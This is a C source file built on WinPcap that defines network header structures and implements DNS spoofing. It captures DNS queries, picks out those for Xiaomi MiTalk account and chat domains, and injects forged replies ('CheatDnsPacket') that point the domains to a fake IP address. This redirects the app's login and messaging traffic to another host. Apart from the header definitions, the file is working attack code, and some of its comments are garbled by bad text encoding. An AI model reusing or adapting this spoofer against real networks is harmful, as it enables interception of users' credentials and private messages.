
#include		"pcap.h"
#include		<IPTYPES.H>
#include		<Iphlpapi.h>
#include		<IPEXPORT.H>
#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"iphlpapi.lib")

#define MY_MAX_PACKET_SIZE			0x10000						
#define MTU							1500
#define MAC_ADDRESS_SIZE			6	
#define MITALK_HTTP_DNS				1
#define MITALK_SSL_DNS				2




typedef struct 
{
	unsigned char			DstMAC[MAC_ADDRESS_SIZE];
	unsigned char			SrcMAC[MAC_ADDRESS_SIZE];
	unsigned short			Protocol;
}MACHEADER,*LPMACHEADER;





typedef struct
{
	unsigned short		HardWareType;
	unsigned short		ProtocolType;
	unsigned char		HardWareSize;
	unsigned char		ProtocolSize;
	unsigned short		Opcode;
	unsigned char		SenderMac[MAC_ADDRESS_SIZE];
	unsigned char		SenderIP[4];
	unsigned char		RecverMac[MAC_ADDRESS_SIZE];
	unsigned char		RecverIP[4];
	unsigned char		Padding[18];	
}ARPHEADER,*LPARPHEADER;



typedef struct
{
	unsigned char			HeaderSize:4;		//uint is 4 bytes
	unsigned char			Version:4;			//watch for sequence! bit feild allocate from high bit

	unsigned char			Undefined:1;
	unsigned char			Cost:1;
	unsigned char			Reliability:1;
	unsigned char			Throughout:1;
	unsigned char			Delay:1;
	unsigned char			Priority:3;
	
	unsigned short			PacketSize;			// ip packet total lenth,net sequence
	unsigned short			PacketID;			// packet ID

	unsigned short			FragmentOffset:13;	//��Ƭƫ�ƣ���8�ֽ�Ϊ��λ��unit is 8 byte
	unsigned short			MF:1;				//MF=1,���滹�з�Ƭ��MF=0,���һ����Ƭ
	unsigned short			DF:1;				//DF=1,�������Ƭ��DF=0,���Է�Ƭ
	unsigned short			Unnamed:1;
		
	unsigned char			TimeToLive;			// ip packet time to live in the network
	unsigned char			Protocol;			// 6= tcp,11=udp,1=icmp,2=igmp
	unsigned short			HeaderChksum;		// ip header checksum,not total packet checksum as tcp!
	unsigned int			SrcIP;				// source ip
	unsigned int			DstIP;				// destination ip
}IPHEADER,*LPIPHEADER;





typedef struct 
{
	unsigned short			SrcPort;			// source port 
	unsigned short			DstPort;			// destination port
	unsigned int 			SeqNum;				// sequence number
	unsigned int 			AckNum;				// acknowledge number

	unsigned short			Reserved:4;			
	unsigned short			HeaderSize:4;		// tcp header size,uint is 4 byte! not byte!
	
	unsigned short			CWR:1;
	unsigned short			ECN_ECHO:1;
	unsigned short			FIN:1;
	unsigned short			SYN:1;
	unsigned short			RST:1;
	unsigned short			PSH:1;
	unsigned short			ACK:1;
	unsigned short			URG:1;
	
	unsigned short			WindowSize;			// window size in communication,general is 64240 bytes
	unsigned short			PacketChksum;		// tcp total packet checksum,not checksum of only header as ip!
	unsigned short			UrgentPtr;			// urgent pointer
} TCPHEADER,*LPTCPHEADER;




typedef struct
{
	unsigned short			SrcPort;			//SrcPort
	unsigned short			DstPort;			//DstPort
	unsigned short			PacketSize;			//packet Lenth,including header and content
	unsigned short			PacketChksum;		//udp total packet checksum,like tcp,but do not like ip packet!
} UDPHEADER,*LPUDPHEADER;




typedef struct									//�����Ӧ���ICMP��ʽͷ,icmp has too many format!
{
	unsigned char			Type;				//type=8 code=0 is request,type=0 code=0 is reply
	unsigned char			Code;
	unsigned short			HeaderChksum;		//icmp header chksum,not include total packet!
	unsigned short			IcmpID;				
	unsigned short			SeqNum;
}ICMPECHOHEADER,*LPICMPECHOHEADER;




typedef struct									//��ʱ���ĺͲ��ɵ��ﱨ�ĵ�ICMPͷ��ʽ,icmp has too many format
{
	unsigned char			Type;				//type=3 nonrechable,type= 11 timeout			
	unsigned char			Code;
	unsigned short			HeaderChksum;		//icmp header checksum
	unsigned int			Undefined;			//undefined,must be 0!
	IPHEADER				IPheader;			//ip header,including ip header options
	unsigned short			ProtocolHeader[4];	//ip packet most front 8 bytes
}ICMPERRORHEADER,*LPICMPERRORHEADER;




typedef struct  
{
	unsigned char	CSRCcount:4;
	unsigned char	HeadExtention:1;
	unsigned char	Padding:1;
	unsigned char	Version:2;

	unsigned char	PayloadType:7;
	unsigned char	Mark:1;

	unsigned short	SeqNum;
	unsigned int	TimeStamp;
	unsigned int	SSRC;			//synchrounous source identifier(SSRC) and contribute source identifier(CSRC)
}RTPHEADER,*LPRTPHEADER;




typedef struct  
{
	unsigned char			ReceptionReportCnt:5;
	unsigned char			Padding:1;
	unsigned char			Version:2;

	unsigned char			PacketType;
	unsigned short			Lenth;
	unsigned int			SenderSSRC;
	unsigned int			TimeStampMSW;
	unsigned int			TimeStampLSW;
	unsigned int			RTPtimestamp;
	unsigned int			SenderPacketCnt;
	unsigned int			SenderOctetCnt;	
}SENDREPORT,*LPSENDREPORT;




typedef struct  
{
	unsigned int			RecvIdentifier;		//ע��Identifierͬ����Identifier���������Identifierָ���Ǳ������ߵ�SSRC
	unsigned int			CumulativePackLost:24;
	unsigned int			FractionLost:8;		//ע������ĺ�����ÿ256�����ᶪ���ٸ�����

	unsigned short			SeqNumCirclesCnt;
	unsigned short			HighestSeqNumRecv;
	unsigned int			Jitter;
	unsigned int			LastSrTimeStamp;
	unsigned int			DelaySinceLastSrTimeStamp;
}SOURCE,*LPSOURCE;




typedef struct  
{
	unsigned char			SourceCnt:5;
	unsigned char			Padding:1;
	unsigned char			Version:2;

	unsigned char			PacketType;
	unsigned short			Lenth;
	unsigned int			Identifier;

	unsigned char			SDEStype;		//SDES==source description items
	unsigned char			SDESlenth;
	unsigned char			SDEStext;
}SRCDESC,*LPSRCDESC;
//Դ������Ŀ��SDES)�е�type�����ֶ���"CNAME","NAME","EMAIL","PHONE",TOOL,"LOC"��Ӣ�ĵ����ַ�����ͷ���ǶԲμӻỰ��λ��һ������
//�м�ĳ����ֶ�Ϊһ���ֽڣ������������͵��ַ�������
//������text�ֶ��Ǹ��ַ������Ƕ��׸��ֶεľ�������




typedef struct  
{
	unsigned char			ReceptionReportCnt:5;
	unsigned char			Padding:1;
	unsigned char			Version:2;

	unsigned char			PacketType;
	unsigned short			Lenth;
	unsigned int			SenderSSRC;
}RECVREPORT,*LPRECVREPORT;




typedef struct
{
	unsigned char			SourceCnt:5;
	unsigned char			Padding:1;
	unsigned char			Version:2;

	unsigned char			PacketType;		//0xcb
	unsigned short			Lenth;
	unsigned int			Identifier;		//�����ߵ�SSRC
}GOODBYE,*LPGOODBYE;




typedef struct  
{
	unsigned short TransactionID;		//����ID�������ͽ��ձ�����ͬ
	unsigned short Flags;				//��־�ֶΣ������ͽ��ն�Ӧ���޸ĸ��ֶ�
	unsigned short Questions;			//�����ʽ
	unsigned short AnswerRRS;			//�ش���Դ��¼����
	unsigned short AuthorityRRS;		//��֤��Դ��¼����
	unsigned short AdditionalRRS;		//������Դ��¼����
}DNSHEADER,*LPDNSHEADER;




//�м��Ҫ������������һ���ǿɴ�ӡ�ַ���ͷ����0��β����������Ž���������Ҫ�󣬺�CLASSҪ��
typedef struct  
{
	unsigned short	Name;				//���ƣ����ֽ�Ϊ�ӿ�ͷ��ƫ�Ƶ�ַ��ֻ��Ҫ����������
	unsigned short	Type;				//���ͣ�0005Ϊ�����ַ�����0001Ϊ����IP��ַ
	unsigned short 	Class;				//����
	unsigned short	HighTTL;			//��������
	unsigned short	LowTTL;
	unsigned short	AddrLen;			//�����ĳ���
	unsigned int	Address;			//����������
	
}DNSANSWER,*LPDNSANSWER;



typedef struct  
{
	unsigned char		Version:4;
	unsigned char		Type:4;
	unsigned char		Code;
	unsigned short		SessionID;
	unsigned short		Lenth;
	unsigned short		Payload;
}PPPOEHEADER,*LPPPPOEHEADER;










unsigned long	ProcessPacketThreadID;
unsigned long	TimerThreadID;
HANDLE			hThreadProcessPacket;
HANDLE			hThreadTimer;


int PACKET_ID	= 0;

/*
//У��ͽ��շ��ļ�����Ϊ0����ȷ,�����ڰ���У��Ͳ��������ֽ�˳��
unsigned short CalcChecksum(unsigned short * DataBuffer,unsigned int DataLenth)
{
	unsigned int Checksum = 0;
	if( DataLenth == 0 )
	{
		return TRUE;
	}
	
	for( ;DataLenth >= 2; )
	{
		Checksum += * DataBuffer;
		DataBuffer ++;
		DataLenth -= 2;
	}
	
	if(DataLenth)
	{
		Checksum += *(unsigned char *)DataBuffer;
	}
	
	Checksum = (Checksum >>16) + (Checksum & 0xffff);
	Checksum = (Checksum >>16) + (Checksum & 0xffff);
	
	return ~(unsigned short)Checksum;
}
*/






WORD CalcChecksum(WORD *buffer,int size)
{
	unsigned long cksum = 0;
	while(1<size)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if(0<size)
		cksum += *(UCHAR*)buffer;
	cksum = (cksum>>16) + (cksum&0xffff);
	cksum += (cksum>>16);
	return(unsigned short)(~cksum);
}









unsigned int  IsMiLiaoDnsQueryPacket(LPDNSHEADER  DnsHeader,unsigned int DnsSize)
{
	char * DomainName = (char *)((unsigned int)DnsHeader + sizeof(DNSHEADER)) ;

	if (memcmp(DomainName, "\x07\x61\x63\x63\x6f\x75\x6e\x74\x06\x78\x69\x61\x6f\x6d\x69\x03\x63\x6f\x6d", 
		strlen("\x07\x61\x63\x63\x6f\x75\x6e\x74\x06\x78\x69\x61\x6f\x6d\x69\x03\x63\x6f\x6d") + 1 ) == 0)
	{
		return MITALK_HTTP_DNS;
	}
	else if (memcmp(DomainName,"\x03\x61\x70\x69\x04\x63\x68\x61\x74\x06\x78\x69\x61\x6f\x6d\x69\x03\x6e\x65\x74",
		strlen("\x03\x61\x70\x69\x04\x63\x68\x61\x74\x06\x78\x69\x61\x6f\x6d\x69\x03\x6e\x65\x74") + 1) == 0)
	{
		return MITALK_SSL_DNS;
	}
	return FALSE;
}






















int CheatDnsPacket(pcap_t * pcap,LPMACHEADER MacHeader,LPIPHEADER IPheader,LPUDPHEADER UDPheader,LPDNSHEADER DNSheader,
				   unsigned int PacketSize,unsigned int DNSdatalen,LPDNSANSWER DnsAnswer,unsigned int Flag)
{
	int iSize;
	int Result;

	DNSheader->Flags			= 0x8081;		
	DNSheader->Questions		= 0x0100;
	DNSheader->AnswerRRS		= 0x0100;
	DNSheader->AuthorityRRS		= 0x0000;
	DNSheader->AdditionalRRS	= 0x0000;

	

	/*
	if (UDPheader->SrcPort == 0x3500)
	{
		int iQueryNameLen = strlen((char*)DNSheader + sizeof(DNSHEADER));

		int iSize;
		if (MacHeader->Protocol == 0x6488)
		{
			LPPPPOEHEADER PPPOEheader = (LPPPPOEHEADER)((unsigned int)MacHeader + sizeof(MACHEADER));
			iSize = 14 + 8 + 20 + 8 + sizeof(DNSHEADER) + iQueryNameLen + 5 + sizeof(DNSANSWER);
			PPPOEheader->Lenth = htons( 8 + 20 + 8 + sizeof(DNSHEADER) + iQueryNameLen + 5 + sizeof(DNSANSWER) + 2);
		}
		else
		{
			iSize = 14 + 20 + 8 + sizeof(DNSHEADER) + iQueryNameLen + 5 + sizeof(DNSANSWER);
		}

		memmove((unsigned char*)DNSheader + 12 + iQueryNameLen + 5, (unsigned char*)DnsAnswer, sizeof(DNSANSWER));
		IPheader->PacketID = rand();
		//PACKET_ID ++;
		*(unsigned char *)((unsigned int)IPheader + 6 ) = 0x40;
		IPheader->PacketSize = ntohs(iSize - 14);
		IPheader->HeaderChksum = CalcChecksum((unsigned short *)IPheader,20);
		UDPheader->PacketSize = ntohs(iSize - 14 - 20);
		UDPheader->PacketChksum = CalcChecksum((unsigned short *)UDPheader, iSize - 14 - 20);

		int Result = pcap_sendpacket(DataMain.pcapLocal, (unsigned char*)MacHeader, iSize);
		if (Result)
		{
			printf("pcap_sendpacket error!ERROR CODE IS:%s\n",pcap_geterr(DataMain.pcapLocal));
		}
		printf("send dns cheat packet ok\n");
		
		return TRUE;
	}
	*/


// 	char * strDnsAnswer = 
// 		"\xc0\x0c\x00\x05\x00\x01\x00\x00\x00\xae\x00\x1b\x03\x61\x70\x69\x04\x63\x68\x61\x74\x068\x63\x6e\x61\x6d\x65\x06\x78\x69\x61\x6f\x6d\x69\x03\x63\x6f\x6d\x00\xc0\x31\x00\x01\x00\x01\x00\x00\x00\xd7\x00\x04\x7c\x80\x49\x0a";
	iSize = sizeof(DNSANSWER);

	//Ҫ��������Э������,����PPPOE
	if (MacHeader->Protocol == 0x6488)
	{
		LPPPPOEHEADER PPPOEheader = (LPPPPOEHEADER)((unsigned int)MacHeader + sizeof(MACHEADER));
		PPPOEheader->Lenth = htons(ntohs(PPPOEheader->Lenth) + iSize);
	}
	
	memmove((unsigned char*)DNSheader + DNSdatalen, (unsigned char *)DnsAnswer,iSize);	
	
	char TmpMac[MAC_ADDRESS_SIZE];
	memmove(TmpMac, MacHeader->DstMAC, MAC_ADDRESS_SIZE);
	memmove(MacHeader->DstMAC, MacHeader->SrcMAC, MAC_ADDRESS_SIZE);
	memmove(MacHeader->SrcMAC, TmpMac, MAC_ADDRESS_SIZE);
	
	IPheader->DF				= 0;
	IPheader->Unnamed			= 0;
	IPheader->FragmentOffset	= 0;
	IPheader->MF				= 0;
	IPheader->PacketSize		= htons(ntohs(IPheader->PacketSize) + iSize);
	
	//*(unsigned char *)((unsigned int)IPheader + 6 ) = 0x40;
	IPheader->PacketID			= rand() + rand();
	PACKET_ID ++;
	IPheader->TimeToLive		= 0x40;	
	IPheader->HeaderChksum		= 0;
	unsigned int TmpIP			= IPheader->SrcIP;
	IPheader->SrcIP				= IPheader->DstIP;
	IPheader->DstIP				= TmpIP;
	IPheader->HeaderChksum		= CalcChecksum((unsigned short*)IPheader,(unsigned int)sizeof(IPHEADER)) ;	//У����������ֽ�˳��
	
	unsigned short  TmpPort		= UDPheader->SrcPort;
	UDPheader->SrcPort			= UDPheader->DstPort;
	UDPheader->DstPort			= TmpPort;
	UDPheader->PacketSize		= htons(ntohs(UDPheader->PacketSize) + iSize);
	UDPheader->PacketChksum		= 0;
	UDPheader->PacketChksum		= CalcChecksum((unsigned short*)UDPheader,ntohs(UDPheader->PacketSize)) ;
	
	Result = pcap_sendpacket(pcap, (unsigned char*)MacHeader, PacketSize + iSize);
	if (Result)
	{
		printf("pcap_sendpacket error!ERROR CODE IS:%s\n",pcap_geterr(pcap));
	}
	//Result = pcap_sendpacket(DataMain.pcapMirror, (unsigned char*)MacHeader, PacketSize + sizeof(DNSANSWER));
	//Result = pcap_sendpacket(DataMain.pcapMirror, (unsigned char*)MacHeader, PacketSize + sizeof(DNSANSWER));
	printf("send dns cheat packet ok\n");
	
	// 	char * strPacket = (char*)MacHeader;
	// 	for (unsigned long iCnt = 0; iCnt < PacketSize + sizeof(DNSANSWER); iCnt ++)
	// 	{
	// 		printf("%02x ",strPacket[iCnt] & 0xff);
	// 	}
	return TRUE;
}









LARGE_INTEGER ProcessByteCnt;
LARGE_INTEGER ProcessPacketCnt;
LARGE_INTEGER RecvByteCnt;
LARGE_INTEGER RecvPacketCnt;















int  ThreadProcessPacket(pcap_t * Pcap_t)
{
	unsigned int			Result;
	pcap_pkthdr *			PktHdr = 0;
	unsigned char *			Packet = 0;	
	//����������Packet[MAX_PACKET_SIZE] ����ȡ��ַ����&Packet������
	unsigned int			PacketSize;
	LPMACHEADER				MACheader;	
	LPPPPOEHEADER			PPPOEheader;
	LPIPHEADER				IPheader;
	LPUDPHEADER				UDPheader;

	DNSANSWER			DnsAnswer;
	DnsAnswer.Name		= 0x0cc0;
	DnsAnswer.Type		= 0x0100;
	DnsAnswer.Class		= 0x0100;
	DnsAnswer.HighTTL	= 0x0100;
	DnsAnswer.LowTTL	= htons(0x8000);
	DnsAnswer.AddrLen	= 0x0400;
	DnsAnswer.Address   = g_ulFakeDestIP;



	while(TRUE)
	{
		Result = pcap_next_ex(Pcap_t, &PktHdr, (const unsigned char**)&Packet);
		if(Result <= 0)			
		{
			//printf("pacap_next_ex time out\n");
			continue;		
		}
		else if(Result == -1)
		{
			printf("pcap_next_ex error code is: %s\n",pcap_geterr(Pcap_t));
			return FALSE;
		}
		else if(Result == 1)
		{						
			PacketSize = PktHdr->caplen;
			MACheader = (LPMACHEADER)Packet;
			if(MACheader->Protocol==0x0008)
			{
				IPheader = (LPIPHEADER)((unsigned int)MACheader + sizeof(MACHEADER));
			}	
			else if (MACheader->Protocol == 0x6488)
			{
				PPPOEheader = (LPPPPOEHEADER)((unsigned int)MACheader + sizeof(MACHEADER));
				if( (PPPOEheader->Version == 1 ) && (PPPOEheader->Type == 1) )
				{
					//if( (PPPOEheader->Payload == 0x2100) && (PPPOEheader->Code == 0) )
					//{
						IPheader = (LPIPHEADER)((unsigned int)PPPOEheader + sizeof(PPPOEHEADER));
					//}
				}
			}
			else
			{
				//printf("denormal packet received\n");
				continue;
			}

			if(IPheader->Protocol==0x11)			
			{
				UDPheader= (LPUDPHEADER)((unsigned int)IPheader + (IPheader->HeaderSize<<2));
				if (ntohs(UDPheader->DstPort) == 53)
				{
					LPDNSHEADER DnsHeader = (LPDNSHEADER)((unsigned int)UDPheader + sizeof(UDPHEADER));
					unsigned int	DnsDataSize = ntohs(UDPheader->PacketSize) - sizeof(UDPHEADER);
					if (*(unsigned int*)((unsigned int)DnsHeader + DnsDataSize - 4) == 0x01000100)
					{
						if (*(unsigned short*)((unsigned int)DnsHeader + 4) == 0x0100)
						{
							if( (*(unsigned short*)((unsigned int)DnsHeader + 6) == 0x0000) && 
								(*(unsigned short*)((unsigned int)DnsHeader + 8) == 0x0000) &&
								(*(unsigned short*)((unsigned int)DnsHeader + 10) == 0x0000) )
							{
								if (Result = IsMiLiaoDnsQueryPacket(DnsHeader,DnsDataSize))
								{
									CheatDnsPacket(Pcap_t,MACheader,IPheader,UDPheader,DnsHeader,PacketSize,DnsDataSize,&DnsAnswer,Result);
									//MiLiaoCheatDnsPacket(Result,MiLiaoResponseDns1, strdsn1len,MiLiaoResponseDns2, strdsn2len);
								}
								ProcessByteCnt.QuadPart += (unsigned int)(PktHdr->caplen);
								ProcessPacketCnt.QuadPart++;
							}
						}
					}
				}
			}

			RecvByteCnt.QuadPart += (unsigned int)(PktHdr->caplen);
			RecvPacketCnt.QuadPart++;
		}
		else
		{
			printf("pcap_next_ex error code is unknown\n");
			continue;
		}
	}
}


